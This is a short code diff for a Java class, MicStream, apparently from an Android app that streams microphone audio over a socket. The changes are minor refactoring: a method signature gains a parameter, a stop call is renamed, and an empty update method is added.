@@ -87,7 +87,7 @@ public class MicStream extends Feature {
 //    }
 
     @Override
-    public void AsyncTaskFunc() {
+    public void AsyncTaskFunc(String Params) {
         try {
             //minBufSize = 640;
             byte[] buffer = new byte[minBufSize];
@@ -102,8 +102,13 @@ public class MicStream extends Feature {
             Log.e("Socket Closed", "");
         } catch (Exception e) {
             Log.e("Exception: ", e.toString());
-            stopStream();
+            stop();
         }
+    }
+
+    @Override
+    public void update(String Params) {
+
     }
 
 //    @Override
